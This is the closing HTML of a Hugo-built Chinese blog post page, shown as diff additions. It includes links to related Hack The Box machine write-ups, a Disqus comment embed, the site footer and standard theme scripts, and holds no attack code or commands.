+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 22, 2025 19:06 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb/sauna/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/sauna/18.3d830739462a37654a93c303f001323a_hub48e0d03ee7a9ada957bd9d0c0dcfa4a_14745947_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Sauna"
+                        
+                        data-hash="md5-PYMHOUYqN2VKk8MD8AEyOg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sauna</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/active/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/active/27.6faf51daa3e3f9c45bdbfcc593af4711_huc411c755081243601305a2c982d14977_13922548_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Active"
+                        
+                        data-hash="md5-b69R2qPj&#43;cRb2/zFk69HEQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Active</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/9.50824acedc6c7db5005cecbc3e1e16e0_hu3e6c4f09660852c02436c669dda3048e_14031331_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post TheNotebook(Docker 逃逸)"
+                        
+                        data-hash="md5-UIJKztxsfbUAXOy8Ph4W4A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TheNotebook(Docker 逃逸)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/tabby/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/tabby/_huee1a8fabd21df51848cd204d42dfde78_13233375_cdf23b2a96af1bb7ddd3268546474667.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Tabby"
+                        
+                        data-hash="md5-GPJIbkn9H07qAGraKwuNxg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tabby</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/traceback/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/traceback/9.%E6%B0%B8%E7%9C%9F%28%E8%8B%B1%E9%BA%BB%29.50824acedc6c7db5005cecbc3e1e16e0_hu3e6c4f09660852c02436c669dda3048e_14031331_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post TraceBack"
+                        
+                        data-hash="md5-UIJKztxsfbUAXOy8Ph4W4A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TraceBack</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    body {
+  position: relative;  
+}
+
+body::before {
+  content: "";
+  position: fixed;  
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url(https://nergigantes.github.io/background/1.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+  z-index: -1;  
+}
+  </style>
+  
+    </body>
+</html>
